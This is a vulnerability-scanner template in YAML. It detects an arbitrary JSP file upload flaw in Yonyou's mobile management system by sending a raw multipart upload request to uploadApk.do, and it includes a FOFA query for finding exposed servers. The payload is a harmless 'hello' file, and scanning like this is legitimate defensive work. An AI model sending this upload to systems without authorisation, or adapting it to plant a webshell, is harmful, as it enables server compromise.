id: uploadApk
info:
  name: uploadApk
  author: mike
  severity: info
  description: 用友 移动管理系统 uploadApk.do 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限
  reference: https://www.cnblogs.com/pursue-security/p/17684819.html
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="用友-移动系统管理"
http:
  - raw:
      - |-
        POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
        Content-Length: 198

        ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
        Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"
        Content-Type: application/msword

        hello
        ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{"status":2}'
      - type: word
        part: header
        words:
          - '200'